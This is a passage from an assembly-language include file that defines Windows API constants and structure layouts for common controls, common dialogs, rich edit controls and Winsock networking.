ACM_PLAY equ WM_USER+101
ACM_STOP equ WM_USER+102
ACN_START equ 1
ACN_STOP equ 2
;-------------------------comctl structures------------------------------
STRUC INIT_COMMON_CONTROLSEX
.dwSize RESD 1
.dwICC RESD 1
ENDSTRUC

STRUC REBARINFO
.cbSize RESD 1
.fMask RESD 1
.himl RESD 1
ENDSTRUC

STRUC REBARBANDINFO
.cbSize RESD 1
.fMask RESD 1
.fStyle RESD 1
.clrFore RESD 1
.clrBack RESD 1
.lpText RESD 1
.cch RESD 1
.iImage RESD 1
.hwndChild RESD 1
.cxMinChild RESD 1
.cyMinChild RESD 1
.lx RESD 1
.hbmBack RESD 1
.wID RESD 1
.cyChild RESD 1
.cyMaxChild RESD 1
.cyIntegral RESD 1
.cxIdeal RESD 1
.lParam RESD 1
.cxHeader RESD 1
ENDSTRUC

STRUC NMREBARCHILDSIZE
.hdr RESB NMHDR_size
.uBand RESD 1
.wID RESD 1
.rcChild RESB RECT_size
.rcBand RESB RECT_size
ENDSTRUC

STRUC NMREBAR
.hdr RESB NMHDR_size
.dwMask RESD 1
.uBand RESD 1
.fStyle RESD 1
.wID RESD 1
.lParam RESD 1
ENDSTRUC

STRUC NMRBAUTOSIZE
.hdr RESB NMHDR_size
.fChanged RESD 1
.rcTarget RESB RECT_size
.rcActual RESB RECT_size
ENDSTRUC

STRUC RB_HITTESTINFO
.pt RESB POINT_size
.flags RESD 1
.iBand RESW 1
ENDSTRUC

STRUC IMAGEINFO
.hbmImage RESD 1
.hbmMask RESD 1
.Unused1 RESD 1
.Unused2 RESD 1
.rcImage RESB RECT_size
ENDSTRUC

STRUC HD_ITEM
.imask RESD 1
.lxy RESD 1
.pszText RESD 1
.hbm RESD 1
.cchTextMax RESD 1
.fmt RESD 1
.lParam RESD 1
ENDSTRUC

STRUC HD_LAYOUT
.prc RESD 1
.pwpos RESD 1
ENDSTRUC

STRUC HD_HITTESTINFO
.pt RESB POINT_size
.flags RESD 1
.iItem RESD 1
ENDSTRUC

STRUC HD_NOTIFY
.hdr RESB NMHDR_size
.iItem RESD 1
.iButton RESD 1
.pitem RESD 1
ENDSTRUC

STRUC TBBUTTON
.iBitmap RESD 1
.idCommand RESD 1
.fsState RESB 1
.fsStyle RESB 1
.dwData RESD 1
.iString RESD 1
ENDSTRUC

STRUC ColorMap
.cmFrom RESD 1
.cmTo RESD 1
ENDSTRUC

STRUC TBADDBITMAP
.hInst RESD 1
.nId RESD 1
ENDSTRUC

STRUC TBSAVEPARAMS
.hkr RESD 1
.pszSubKey RESD 1
.pszValueName RESD 1
ENDSTRUC

STRUC TBREPLACEBITMAP
.hInstOld RESD 1
.nIdOld RESD 1
.hInstNew RESD 1
.nIdNew RESD 1
.nButtons RESD 1
ENDSTRUC

STRUC TBNOTIFY
.hdr RESB NMHDR_size
.iItem RESD 1
.tbButton RESB TBBUTTON_size
.cchText RESD 1
.pszText RESD 1
ENDSTRUC

STRUC TOOLINFO
.cbSize RESD 1
.uFlags RESD 1
.hWnd RESD 1
.uId RESD 1
.rect RESB RECT_size
.hInst RESD 1
.lpszText RESD 1
.lParam RESD 1
ENDSTRUC

STRUC TT_HITTESTINFO
.hWnd RESD 1
.pt RESB POINT_size
.ti RESB TOOLINFO_size
ENDSTRUC

STRUC TOOLTIPTEXT
.hdr RESB NMHDR_size
.lpszText RESD 1
.szText RESB 80
.hInst RESD 1
.uFlags RESD 1
ENDSTRUC

STRUC DRAGLISTINFO
.uNotification RESD 1
.hWnd RESD 1
.ptCursor RESB POINT_size
ENDSTRUC

STRUC UDACCEL
.nSec RESD 1
.nInc RESD 1
ENDSTRUC

STRUC NM_UPDOWN
.hdr RESB NMHDR_size
.iPos RESD 1
.iDelta RESD 1
ENDSTRUC

STRUC LV_ITEM
.imask RESD 1
.iItem RESD 1
.iSubItem RESD 1
.state RESD 1
.stateMask RESD 1
.pszText RESD 1
.cchTextMax RESD 1
.iImage RESD 1
.lParam RESD 1
ENDSTRUC

STRUC LV_FINDINFO
.flags RESD 1
.psz RESD 1
.lParam RESD 1
.pt RESB POINT_size
.vkDirection RESD 1
ENDSTRUC

STRUC LV_HITTESTINFO
.pt RESB POINT_size
.flags RESD 1
.iItem RESD 1
ENDSTRUC

STRUC LV_COLUMN
.imask RESD 1
.fmt RESD 1
.lx RESD 1
.pszText RESD 1
.cchTextMax RESD 1
.iSubItem RESD 1
ENDSTRUC

STRUC NM_LISTVIEW
.hdr RESB NMHDR_size
.iItem RESD 1
.iSubItem RESD 1
.uNewState RESD 1
.uOldState RESD 1
.uChanged RESD 1
.ptAction RESB POINT_size
.lParam RESD 1
ENDSTRUC

STRUC LV_DISPINFO
.hdr RESB NMHDR_size
.item RESD 1
ENDSTRUC

STRUC LV_KEYDOWN
.hdr RESB NMHDR_size
.wVKey RESW 1
.flags RESD 1
ENDSTRUC

STRUC TREEITEM
.dummy RESD 1
ENDSTRUC

STRUC TV_ITEM
.imask RESD 1
.hItem RESD 1
.state RESD 1
.stateMask RESD 1
.pszText RESD 1
.cchTextMax RESD 1
.iImage RESD 1
.iSelectedImage RESD 1
.cChildren RESD 1
.lParam RESD 1
ENDSTRUC

STRUC TV_INSERTSTRUCT
.hParent RESD 1
.hInsertAfter RESD 1
.item RESD 1
ENDSTRUC

STRUC TV_HITTESTINFO
.pt RESB POINT_size
.flags RESD 1
.hItem RESD 1
ENDSTRUC

STRUC TV_SORTCB
.hParent RESD 1
.lpfnCompare RESD 1
.lParam RESD 1
ENDSTRUC

STRUC NM_TREEVIEW
.hdr RESB NMHDR_size
.action RESD 1
.itemOld RESD 1
.itemNew RESD 1
.ptDrag RESB POINT_size
ENDSTRUC

STRUC TV_DISPINFO
.hdr RESB NMHDR_size
.item RESD 1
ENDSTRUC

STRUC TV_KEYDOWN
.hdr RESB NMHDR_size
.wVKey RESW 1
.flags RESD 1
ENDSTRUC

STRUC TC_ITEMHEADER
.imask RESD 1
.lpReserved1 RESD 1
.lpReserved2 RESD 1
.pszText RESD 1
.cchTextMax RESD 1
.iImage RESD 1
ENDSTRUC

STRUC TC_ITEM
.imask RESD 1
.lpReserved1 RESD 1
.lpReserved2 RESD 1
.pszText RESD 1
.cchTextMax RESD 1
.iImage RESD 1
.lParam RESD 1
ENDSTRUC

STRUC TC_HITTESTINFO
.pt RESB POINT_size
.flags RESD 1
ENDSTRUC

STRUC TC_KEYDOWN
.hdr RESB NMHDR_size
.wVKey RESW 1
.flags RESD 1
ENDSTRUC

;--------------------------comdlg equates-------------------------------
CDERR_GENERALCODES equ 0000h
CDERR_STRUCTSIZE equ 0001h
CDERR_INITIALIZATION equ 0002h
CDERR_NOTEMPLATE equ 0003h
CDERR_NOHINSTANCE equ 0004h
CDERR_LOADSTRFAILURE equ 0005h
CDERR_FINDRESFAILURE equ 0006h
CDERR_LOADRESFAILURE equ 0007h
CDERR_LOCKRESFAILURE equ 0008h
CDERR_MEMALLOCFAILURE equ 0009h
CDERR_MEMLOCKFAILURE equ 000Ah
CDERR_NOHOOK equ 000Bh
CDERR_REGISTERMSGFAIL equ 000Ch
CC_RGBINIT equ 00000001h
CC_FULLOPEN equ 00000002h
CC_PREVENTFULLOPEN equ 00000004h
CC_SHOWHELP equ 00000008h
CC_ENABLEHOOK equ 00000010h
CC_ENABLETEMPLATE equ 00000020h
CC_ENABLETEMPLATEHANDLE equ 00000040h
CCERR_CHOOSECOLORCODES equ 5000h
FR_DOWN equ 00000001h
FR_WHOLEWORD equ 00000002h
FR_MATCHCASE equ 00000004h
FR_FINDNEXT equ 00000008h
FR_REPLACE equ 00000010h
FR_REPLACEALL equ 00000020h
FR_DIALOGTERM equ 00000040h
FR_SHOWHELP equ 00000080h
FR_ENABLEHOOK equ 00000100h
FR_ENABLETEMPLATE equ 00000200h
FR_NOUPDOWN equ 00000400h
FR_NOMATCHCASE equ 00000800h
FR_NOWHOLEWORD equ 00001000h
FR_ENABLETEMPLATEHANDLE equ 00002000h
FR_HIDEUPDOWN equ 00004000h
FR_HIDEMATCHCASE equ 00008000h
FR_HIDEWHOLEWORD equ 00010000h
FRERR_FINDREPLACECODES equ 4000h
FRERR_BUFFERLENGTHZERO equ 4001h
CF_SCREENFONTS equ 00000001h
CF_PRINTERFONTS equ 00000002h
CF_BOTH equ CF_SCREENFONTS+CF_PRINTERFONTS
CF_SHOWHELP equ 00000004h
CF_ENABLEHOOK equ 00000008h
CF_ENABLETEMPLATE equ 00000010h
CF_ENABLETEMPLATEHANDLE equ 00000020h
CF_INITTOLOGFONTSTRUCT equ 00000040h
CF_USESTYLE equ 00000080h
CF_EFFECTS equ 00000100h
CF_APPLY equ 00000200h
CF_ANSIONLY equ 00000400h
CF_NOVECTORFONTS equ 00000800h
CF_NOOEMFONTS equ CF_NOVECTORFONTS
CF_NOSIMULATIONS equ 00001000h
CF_LIMITSIZE equ 00002000h
CF_FIXEDPITCHONLY equ 00004000h
CF_WYSIWYG equ 00008000h
CF_FORCEFONTEXIST equ 00010000h
CF_SCALABLEONLY equ 00020000h
CF_TTONLY equ 00040000h
CF_NOFACESEL equ 00080000h
CF_NOSTYLESEL equ 00100000h
CF_NOSIZESEL equ 00200000h
CFERR_CHOOSEFONTCODES equ 2000h
CFERR_NOFONTS equ 2001h
CFERR_MAXLESSTHANMIN equ 2002h
WM_CHOOSEFONT_GETLOGFONT equ WM_USER+1
CD_LBSELNOITEMS equ -1
CD_LBSELCHANGE equ 0
CD_LBSELSUB equ 1
CD_LBSELADD equ 2
PD_ALLPAGES equ 00000000h
PD_SELECTION equ 00000001h
PD_PAGENUMS equ 00000002h
PD_NOSELECTION equ 00000004h
PD_NOPAGENUMS equ 00000008h
PD_COLLATE equ 00000010h
PD_PRINTTOFILE equ 00000020h
PD_PRINTSETUP equ 00000040h
PD_NOWARNING equ 00000080h
PD_RETURNDC equ 00000100h
PD_RETURNIC equ 00000200h
PD_RETURNDEFAULT equ 00000400h
PD_SHOWHELP equ 00000800h
PD_ENABLEPRINTHOOK equ 00001000h
PD_ENABLESETUPHOOK equ 00002000h
PD_ENABLEPRINTTEMPLATE equ 00004000h
PD_ENABLESETUPTEMPLATE equ 00008000h
PD_ENABLEPRINTTEMPLATEHANDLE equ 00010000h
PD_ENABLESETUPTEMPLATEHANDLE equ 00020000h
PD_USEDEVMODECOPIES equ 00040000h
PD_DISABLEPRINTTOFILE equ 00080000h
PD_HIDEPRINTTOFILE equ 00100000h
PDERR_PRINTERCODES equ 1000h
PDERR_SETUPFAILURE equ 1001h
PDERR_PARSEFAILURE equ 1002h
PDERR_RETDEFFAILURE equ 1003h
PDERR_LOADDRVFAILURE equ 1004h
PDERR_GETDEVMODEFAIL equ 1005h
PDERR_INITFAILURE equ 1006h
PDERR_NODEVICES equ 1007h
PDERR_NODEFAULTPRN equ 1008h
PDERR_DNDMMISMATCH equ 1009h
PDERR_CREATEICFAILURE equ 100Ah
PDERR_PRINTERNOTFOUND equ 100Bh
PDERR_DEFAULTDIFFERENT equ 100Ch
DN_DEFAULTPRN equ 0001h
OFN_ALLOWMULTISELECT equ 00000200h
OFN_CREATEPROMPT equ 00002000h
OFN_ENABLEHOOK equ 00000020h
OFN_ENABLETEMPLATE equ 00000040h
OFN_ENABLETEMPLATEHANDLE equ 00000080h
OFN_EXPLORER equ 00080000h
OFN_EXTENSIONDIFFERENT equ 00000400h
OFN_FILEMUSTEXIST equ 00001000h
OFN_HIDEREADONLY equ 00000004h
OFN_LONGNAMES equ 00200000h
OFN_NOCHANGEDIR equ 00000008h
OFN_NODEREFERENCELINKS equ 00100000h
OFN_NOLONGNAMES equ 00040000h
OFN_NONETWORKBUTTON equ 00020000h
OFN_NOREADONLYRETURN equ 00008000h
OFN_NOTESTFILECREATE equ 00010000h
OFN_NOVALIDATE equ 00000100h
OFN_OVERWRITEPROMPT equ 00000002h
OFN_PATHMUSTEXIST equ 00000800h
OFN_READONLY equ 00000001h
OFN_SHAREAWARE equ 00004000h
OFN_SHOWHELP equ 00000010h
OFN_SHAREFALLTHROUGH equ 2
OFN_SHARENOWARN equ 1
OFN_SHAREWARN equ 0
CDERR_DIALOGFAILURE equ 0FFFFh
FNERR_FILENAMECODES equ 3000h
FNERR_SUBCLASSFAILURE equ 3001h
FNERR_INVALIDFILENAME equ 3002h
FNERR_BUFFERTOOSMALL equ 3003h
;--------------------------comdlg structures----------------------------
STRUC CHOOSECOLORAPI
.lStructSize RESD 1
.hwndOwner RESD 1
.hInstance RESD 1
.rgbResult RESD 1
.lpCustColors RESD 1
.Flags RESD 1
.lCustData RESD 1
.lpfnHook RESD 1
.lpTemplateName RESD 1
ENDSTRUC

STRUC FINDREPLACE
.lStructSize RESD 1
.hWndOwner RESD 1
.hInstance RESD 1
.Flags RESD 1
.lpstrFindWhat RESD 1
.lpstrReplaceWith RESD 1
.wFindWhatLen RESW 1
.wReplaceWithLen RESW 1
.lCustData RESD 1
.lpfnHook RESD 1
.lpTemplateName RESD 1
ENDSTRUC

STRUC CHOOSEFONTAPI
.lStructSize RESD 1
.hWndOwner RESD 1
.hDC RESD 1
.lpLogFont RESD 1
.iPointSize RESD 1
.Flags RESD 1
.rgbColors RESD 1
.lCustData RESD 1
.lpfnHook RESD 1
.lpTemplateName RESD 1
.hInstance RESD 1
.lpszStyle RESD 1
.nFontType RESW 1
.Alignment RESW 1
.nSizeMin RESD 1
.nSizeMax RESD 1
ENDSTRUC

STRUC PRINTDLGAPI
.lStructSize RESD 1
.hWndOwner RESD 1
.hDevMode RESD 1
.hDevNames RESD 1
.hDC RESD 1
.Flags RESD 1
.nFromPage RESW 1
.nToPage RESW 1
.nMinPage RESW 1
.nMaxPage RESW 1
.nCopies RESW 1
.hInstance RESD 1
.lCustData RESD 1
.lpfnPrintHook RESD 1
.lpfnSetupHook RESD 1
.lpPrintTemplateName RESD 1
.lpPrintSetupTemplateName RESD 1
.hPrintTemplate RESD 1
.hSetupTemplate RESD 1
ENDSTRUC

STRUC OPENFILENAME
.lStructSize RESD 1
.hWndOwner RESD 1
.hInstance RESD 1
.lpstrFilter RESD 1
.lpstrCustomFilter RESD 1
.nMaxCustFilter RESD 1
.nFilterIndex RESD 1
.lpstrFile RESD 1
.nMaxFile RESD 1
.lpstrFileTitle RESD 1
.nMaxFileTitle RESD 1
.lpstrInitialDir RESD 1
.lpstrTitle RESD 1
.Flags RESD 1
.nFileOffset RESW 1
.nFileExtension RESW 1
.lpstrDefExt RESD 1
.lCustData RESD 1
.lpfnHook RESD 1
.lpTemplateName RESD 1
ENDSTRUC

;--------------------------riched equates-------------------------------
cchTextLimitDefault equ 32767
EM_CANPASTE equ WM_USER+50
EM_DISPLAYBAND equ WM_USER+51
EM_EXGETSEL equ WM_USER+52
EM_EXLIMITTEXT equ WM_USER+53
EM_EXLINEFROMCHAR equ WM_USER+54
EM_EXSETSEL equ WM_USER+55
EM_FINDTEXT equ WM_USER+56
EM_FORMATRANGE equ WM_USER+57
EM_GETCHARFORMAT equ WM_USER+58
EM_GETEVENTMASK equ WM_USER+59
EM_GETOLEINTERFACE equ WM_USER+60
EM_GETPARAFORMAT equ WM_USER+61
EM_GETSELTEXT equ WM_USER+62
EM_HIDESELECTION equ WM_USER+63
EM_PASTESPECIAL equ WM_USER+64
EM_REQUESTRESIZE equ WM_USER+65
EM_SELECTIONTYPE equ WM_USER+66
EM_SETBKGNDCOLOR equ WM_USER+67
EM_SETCHARFORMAT equ WM_USER+68
EM_SETEVENTMASK equ WM_USER+69
EM_SETOLECALLBACK equ WM_USER+70
EM_SETPARAFORMAT equ WM_USER+71
EM_SETTARGETDEVICE equ WM_USER+72
EM_STREAMIN equ WM_USER+73
EM_STREAMOUT equ WM_USER+74
EM_GETTEXTRANGE equ WM_USER+75
EM_FINDWORDBREAK equ WM_USER+76
EM_SETOPTIONS equ WM_USER+77
EM_GETOPTIONS equ WM_USER+78
EM_FINDTEXTEX equ WM_USER+79
EM_GETWORDBREAKPROCEX equ WM_USER+80
EM_SETWORDBREAKPROCEX equ WM_USER+81
EM_SETPUNCTUATION equ WM_USER+100
EM_GETPUNCTUATION equ WM_USER+101
EM_SETWORDWRAPMODE equ WM_USER+102
EM_GETWORDWRAPMODE equ WM_USER+103
EM_SETIMECOLOR equ WM_USER+104
EM_GETIMECOLOR equ WM_USER+105
EM_SETIMEOPTIONS equ WM_USER+106
EM_GETIMEOPTIONS equ WM_USER+107
EN_MSGFILTER equ 0700h
EN_REQUESTRESIZE equ 0701h
EN_SELCHANGE equ 0702h
EN_DROPFILES equ 0703h
EN_PROTECTED equ 0704h
EN_CORRECTTEXT equ 0705h
EN_STOPNOUNDO equ 0706h
EN_IMECHANGE equ 0707h
EN_SAVECLIPBOARD equ 0708h
EN_OLEOPFAILED equ 0709h
ENM_NONE equ 00000000h
ENM_CHANGE equ 00000001h
ENM_UPDATE equ 00000002h
ENM_SCROLL equ 00000004h
ENM_KEYEVENTS equ 00010000h
ENM_MOUSEEVENTS equ 00020000h
ENM_REQUESTRESIZE equ 00040000h
ENM_SELCHANGE equ 00080000h
ENM_DROPFILES equ 00100000h
ENM_PROTECTED equ 00200000h
ENM_CORRECTTEXT equ 00400000h
ENM_IMECHANGE equ 00800000h
ES_SAVESEL equ 00008000h
ES_SUNKEN equ 00004000h
ES_DISABLENOSCROLL equ 00002000h
ES_SELECTIONBAR equ 01000000h
ES_EX_NOCALLOLEINIT equ 01000000h
ES_VERTICAL equ 00400000h
ES_NOIME equ 00080000h
ES_SELFIME equ 00040000h
ECO_AUTOWORDSELECTION equ 00000001h
ECO_AUTOVSCROLL equ 00000040h
ECO_AUTOHSCROLL equ 00000080h
ECO_NOHIDESEL equ 00000100h
ECO_READONLY equ 00000800h
ECO_WANTRETURN equ 00001000h
ECO_SAVESEL equ 00008000h
ECO_SELECTIONBAR equ 01000000h
ECO_VERTICAL equ 00400000h
ECOOP_SET equ 0001h
ECOOP_OR equ 0002h
ECOOP_AND equ 0003h
ECOOP_XOR equ 0004h
WB_CLASSIFY equ 3
WB_MOVEWORDLEFT equ 4
WB_MOVEWORDRIGHT equ 5
WB_LEFTBREAK equ 6
WB_RIGHTBREAK equ 7
WB_MOVEWORDPREV equ 4
WB_MOVEWORDNEXT equ 5
WB_PREVBREAK equ 6
WB_NEXTBREAK equ 7
PC_FOLLOWING equ 1
PC_LEADING equ 2
PC_OVERFLOW equ 3
PC_DELIMITER equ 4
WBF_WORDWRAP equ 010h
WBF_WORDBREAK equ 020h
WBF_OVERFLOW equ 040h
WBF_LEVEL1 equ 080h
WBF_LEVEL2 equ 100h
WBF_CUSTOM equ 200h
IMF_FORCENONE equ 0001h
IMF_FORCEENABLE equ 0002h
IMF_FORCEDISABLE equ 0004h
IMF_CLOSESTATUSWINDOW equ 0008h
IMF_VERTICAL equ 0020h
IMF_FORCEACTIVE equ 0040h
IMF_FORCEINACTIVE equ 0080h
IMF_FORCEREMEMBER equ 0100h
WBF_CLASS equ 0Fh
WBF_ISWHITE equ 10h
WBF_BREAKLINE equ 20h
WBF_BREAKAFTER equ 40h
CFM_BOLD equ 00000001h
CFM_ITALIC equ 00000002h
CFM_UNDERLINE equ 00000004h
CFM_STRIKEOUT equ 00000008h
CFM_PROTECTED equ 00000010h
CFM_SIZE equ 80000000h
CFM_COLOR equ 40000000h
CFM_FACE equ 20000000h
CFM_OFFSET equ 10000000h
CFM_CHARSET equ 08000000h
CFE_BOLD equ 0001h
CFE_ITALIC equ 0002h
CFE_UNDERLINE equ 0004h
CFE_STRIKEOUT equ 0008h
CFE_PROTECTED equ 0010h
CFE_AUTOCOLOR equ 40000000h
yHeightCharPtsMost equ 1638
SCF_SELECTION equ 0001h
SCF_WORD equ 0002h
SF_TEXT equ 0001h
SF_RTF equ 0002h
SF_RTFNOOBJS equ 0003h
SF_TEXTIZED equ 0004h
SFF_SELECTION equ 8000h
SFF_PLAINRTF equ 4000h
MAX_TAB_STOPS equ 32
lDefaultTab equ 720
PFM_STARTINDENT equ 00000001h
PFM_RIGHTINDENT equ 00000002h
PFM_OFFSET equ 00000004h
PFM_ALIGNMENT equ 00000008h
PFM_TABSTOPS equ 00000010h
PFM_NUMBERING equ 00000020h
PFM_OFFSETINDENT equ 80000000h
PFN_BULLET equ 0001h
PFA_LEFT equ 0001h
PFA_RIGHT equ 0002h
PFA_CENTER equ 0003h
SEL_EMPTY equ 0000h
SEL_TEXT equ 0001h
SEL_OBJECT equ 0002h
SEL_MULTICHAR equ 0004h
SEL_MULTIOBJECT equ 0008h
OLEOP_DOVERB equ 1
;--------------------------riched structures-----------------------------
STRUC CHARFORMAT
.cbSize RESD 1
.dwMask RESD 1
.dwEffects RESD 1
.yHeight RESD 1
.yOffset RESD 1
.crTextColor RESD 1
.bCharSet RESB 1
.bPitchAndFamily RESB 1
.szFaceName RESB 1
ENDSTRUC

STRUC CHARRANGE
.cpMin RESD 1
.cpMax RESD 1
ENDSTRUC

STRUC TEXTRANGE
.chrg RESB CHARRANGE_size
.lpstrText RESD 1
ENDSTRUC

STRUC EDITSTREAM
.dwCookie RESD 1
.dwError RESD 1
.pfnCallback RESD 1
ENDSTRUC

STRUC FINDTEXT
.chrg RESB CHARRANGE_size
.lpstrText RESD 1
ENDSTRUC

STRUC FINDTEXTEX
.chrg RESB CHARRANGE_size
.lpstrText RESD 1
.chrgText RESB CHARRANGE_size
ENDSTRUC

STRUC FORMATRANGE
.hdc RESD 1
.hdcTarget RESD 1
.rc RESB RECT_size
.rcPage RESB RECT_size
.chrg RESB CHARRANGE_size
ENDSTRUC

STRUC PARAFORMAT
.cbSize RESD 1
.dwMask RESD 1
.wNumbering RESW 1
.wReserved RESW 1
.dxStartIndent RESD 1
.dxRightIndent RESD 1
.dxOffset RESD 1
.wAlignment RESW 1
.cTabCount RESW 1
.rgxTabs RESD 1
ENDSTRUC

STRUC MSGFILTER
.nmhdr RESB NMHDR_size
.msg RESD 1
.wParam RESD 1
.lParam RESD 1
ENDSTRUC

STRUC REQRESIZE
.nmhdr RESB NMHDR_size
.rc RESB RECT_size
ENDSTRUC

STRUC SELCHANGE
.nmhdr RESB NMHDR_size
.chrg RESB CHARRANGE_size
.seltyp RESW 1
ENDSTRUC

STRUC ENDROPFILES
.nmhdr RESB NMHDR_size
.hDrop RESD 1
.cp RESD 1
.fProtected RESD 1
ENDSTRUC

STRUC ENPROTECTED
.nmhdr RESB NMHDR_size
.msg RESD 1
.wParam RESD 1
.lParam RESD 1
.chrg RESB CHARRANGE_size
ENDSTRUC

STRUC ENSAVECLIPBOARD
.nmhdr RESB NMHDR_size
.cObjectCount RESD 1
.cch RESD 1
ENDSTRUC

STRUC ENOLEOPFAILED
.nmhdr RESB NMHDR_size
.iob RESD 1
.lOper RESD 1
.hr RESD 1
ENDSTRUC

STRUC ENCORRECTTEXT
.nmhdr RESB NMHDR_size
.chrg RESB CHARRANGE_size
.seltyp RESW 1
ENDSTRUC

STRUC PUNCTUATION
.iSize RESD 1
.szPunctuation RESD 1
ENDSTRUC

STRUC COMPCOLOR
.crText RESD 1
.crBackground RESD 1
.dwEffects RESD 1
ENDSTRUC

STRUC REPASTESPECIAL
.dwAspect RESD 1
.dwParam RESD 1
ENDSTRUC

;--------------------------wsock32 equates-------------------------------
WSADESCRIPTION_LEN equ 256
WSASYS_STATUS_LEN equ 128
IPPROTO_IP equ 0
IPPROTO_ICMP equ 1
IPPROTO_GGP equ 2
IPPROTO_TCP equ 6
IPPROTO_PUP equ 12
IPPROTO_UDP equ 17
IPPROTO_IDP equ 22
IPPROTO_ND equ 77
IPPROTO_RAW equ 255
IPPROTO_MAX equ 256
IOCPARM_MASK equ 7Fh
IOC_VOID equ 20000000h
IOC_OUT equ 40000000h
IOC_IN equ 80000000h
IOC_INOUT equ IOC_IN|IOC_OUT
FIONBIO equ 8004667Eh
FIONSYNC equ 8004667Dh
FIONREAD equ 4004667Fh
IPPORT_ECHO equ 7
IPPORT_DISCARD equ 9
IPPORT_SYSTAT equ 11
IPPORT_DAYTIME equ 13
IPPORT_NETSTAT equ 15
IPPORT_FTP equ 21
IPPORT_TELNET equ 23
IPPORT_SMTP equ 25
IPPORT_TIMESERVER equ 37
IPPORT_NAMESERVER equ 42
IPPORT_WHOIS equ 43
IPPORT_MTP equ 57
IPPORT_TFTP equ 69
IPPORT_RJE equ 77
IPPORT_FINGER equ 79
IPPORT_TTYLINK equ 87
IPPORT_SUPDUP equ 95
IPPORT_EXECSERVER equ 512
IPPORT_LOGINSERVER equ 513
IPPORT_CMDSERVER equ 514
IPPORT_EFSSERVER equ 520
IPPORT_BIFFUDP equ 512
IPPORT_WHOSERVER equ 513
IPPORT_ROUTESERVER equ 520
IPPORT_RESERVED equ 1024
IMPLINK_IP equ 155
IMPLINK_LOWEXPER equ 156
IMPLINK_HIGHEXPER equ 158
IN_CLASSA_NET equ 0FF000000h
IN_CLASSA_NSHIFT equ 24
IN_CLASSA_HOST equ 000FFFFFFh
IN_CLASSA_MAX equ 128
IN_CLASSB_NET equ 0FFFF0000h
IN_CLASSB_NSHIFT equ 16
IN_CLASSB_HOST equ 00000FFFFh
IN_CLASSB_MAX equ 65536
IN_CLASSC_NET equ 0FFFFFF00h
IN_CLASSC_NSHIFT equ 8
IN_CLASSC_HOST equ 0000000FFh
INADDR_ANY equ 000000000h
INADDR_LOOPBACK equ 07F000001h
INADDR_BROADCAST equ 0FFFFFFFFh
INADDR_NONE equ 0FFFFFFFFh
SOCK_STREAM equ 1
SOCK_DGRAM equ 2
SOCK_RAW equ 3
SOCK_RDM equ 4
SOCK_SEQPACKET equ 5
SO_DEBUG equ 00001h
SO_ACCEPTCONN equ 00002h
SO_REUSEADDR equ 00004h
SO_KEEPALIVE equ 00008h
SO_DONTROUTE equ 00010h
SO_BROADCAST equ 00020h
SO_USELOOPBACK equ 00040h
SO_LINGER equ 00080h
SO_OOBINLINE equ 00100h
SOL_SOCKET equ 0FFFFh
SO_DONTLINGER equ (-1-SO_LINGER)
SO_SNDBUF equ 01001h
SO_RCVBUF equ 01002h
SO_SNDLOWAT equ 01003h
SO_RCVLOWAT equ 01004h
SO_SNDTIMEO equ 01005h
SO_RCVTIMEO equ 01006h
SO_ERROR equ 01007h
SO_TYPE equ 01008h
TCP_NODELAY equ 00001h
AF_UNSPEC equ 0
AF_UNIX equ 1
AF_INET equ 2
AF_IMPLINK equ 3
AF_PUP equ 4
AF_CHAOS equ 5
AF_NS equ 6
AF_IPX equ 6
AF_ISO equ 7
AF_OSI equ AF_ISO
AF_ECMA equ 8
AF_DATAKIT equ 9
AF_CCITT equ 10
AF_SNA equ 11
AF_DECnet equ 12
AF_DLI equ 13
AF_LAT equ 14
AF_HYLINK equ 15
AF_APPLETALK equ 16
AF_NETBIOS equ 17
AF_MAX equ 18
PF_UNSPEC equ AF_UNSPEC
PF_UNIX equ AF_UNIX
PF_INET equ AF_INET
PF_IMPLINK equ AF_IMPLINK
PF_PUP equ AF_PUP
PF_CHAOS equ AF_CHAOS
PF_NS equ AF_NS
PF_IPX equ AF_IPX
PF_ISO equ AF_ISO
PF_OSI equ AF_OSI
PF_ECMA equ AF_ECMA
PF_DATAKIT equ AF_DATAKIT
PF_CCITT equ AF_CCITT
PF_SNA equ AF_SNA
PF_DECnet equ AF_DECnet
PF_DLI equ AF_DLI
PF_LAT equ AF_LAT
PF_HYLINK equ AF_HYLINK
PF_APPLETALK equ AF_APPLETALK
PF_MAX equ AF_MAX
SOMAXCONN equ 5
MSG_OOB equ 01h
MSG_PEEK equ 02h
MSG_DONTROUTE equ 04h
MSG_MAXIOVLEN equ 16
MAXGETHOSTSTRUCT equ 1024
FD_READ equ 001h
FD_WRITE equ 002h
FD_OOB equ 004h
FD_ACCEPT equ 008h
FD_CONNECT equ 010h
FD_CLOSE equ 020h
WSABASEERR equ 10000
WSAEINTR equ WSABASEERR+4
WSAEBADF equ WSABASEERR+9
WSAEACCES equ WSABASEERR+13
WSAEFAULT equ WSABASEERR+14
WSAEINVAL equ WSABASEERR+22
WSAEMFILE equ WSABASEERR+24
WSAEWOULDBLOCK equ WSABASEERR+35
WSAEINPROGRESS equ WSABASEERR+36
WSAEALREADY equ WSABASEERR+37
WSAENOTSOCK equ WSABASEERR+38
WSAEDESTADDRREQ equ WSABASEERR+39
WSAEMSGSIZE equ WSABASEERR+40
WSAEPROTOTYPE equ WSABASEERR+41
WSAENOPROTOOPT equ WSABASEERR+42
WSAEPROTONOSUPPORT equ WSABASEERR+43
WSAESOCKTNOSUPPORT equ WSABASEERR+44
WSAEOPNOTSUPP equ WSABASEERR+45
WSAEPFNOSUPPORT equ WSABASEERR+46
WSAEAFNOSUPPORT equ WSABASEERR+47
WSAEADDRINUSE equ WSABASEERR+48
WSAEADDRNOTAVAIL equ WSABASEERR+49
WSAENETDOWN equ WSABASEERR+50
WSAENETUNREACH equ WSABASEERR+51
WSAENETRESET equ WSABASEERR+52
WSAECONNABORTED equ WSABASEERR+53
WSAECONNRESET equ WSABASEERR+54
WSAENOBUFS equ WSABASEERR+55
WSAEISCONN equ WSABASEERR+56
WSAENOTCONN equ WSABASEERR+57
WSAESHUTDOWN equ WSABASEERR+58
WSAETOOMANYREFS equ WSABASEERR+59
WSAETIMEDOUT equ WSABASEERR+60
WSAECONNREFUSED equ WSABASEERR+61
WSAELOOP equ WSABASEERR+62
WSAENAMETOOLONG equ WSABASEERR+63
WSAEHOSTDOWN equ WSABASEERR+64
WSAEHOSTUNREACH equ WSABASEERR+65
WSAENOTEMPTY equ WSABASEERR+66
WSAEPROCLIM equ WSABASEERR+67
WSAEUSERS equ WSABASEERR+68
WSAEDQUOT equ WSABASEERR+69
WSAESTALE equ WSABASEERR+70
WSAEREMOTE equ WSABASEERR+71
WSASYSNOTREADY equ WSABASEERR+91
